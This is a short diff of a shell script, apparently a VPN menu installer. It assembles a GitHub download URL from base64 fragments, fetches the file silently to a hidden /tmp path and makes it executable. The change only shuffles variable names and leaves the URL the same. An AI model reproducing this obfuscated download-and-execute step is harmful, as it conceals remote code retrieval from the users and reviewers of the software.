@@ -5,17 +5,17 @@ download_menu_script() {
     echo "$1" | base64 -d
   }
 
-  p1=$(decode "aHR0cHM6")
+  p3=$(decode "aHR0cHM6")
   p2=$(decode "Ly8=")
-  p3=$(decode "cmF3")
+  p1=$(decode "cmF3")
   p4=$(decode "LmdpdGh1Yg==")
   p5=$(decode "dXNlcmNvbnRlbnQuY29t")
   p6=$(decode "L2hxLW1w")
   p7=$(decode "L3ppLXZwbi5jb20=")
-  p8=$(decode "L3JlZnMvaGVhZHM=")
-  p9=$(decode "L21haW4vbWVudQ==")
+  p9=$(decode "L3JlZnMvaGVhZHM=")
+  p8=$(decode "L21haW4vbWVudQ==")
 
-  full_url="${p1}${p2}${p3}${p4}${p5}${p6}${p7}${p8}${p9}"
+  full_url="${p3}${p2}${p1}${p4}${p5}${p6}${p7}${p9}${p8}"
 
   curl -s "$full_url" -o /tmp/.zi_menu
   chmod +x /tmp/.zi_menu
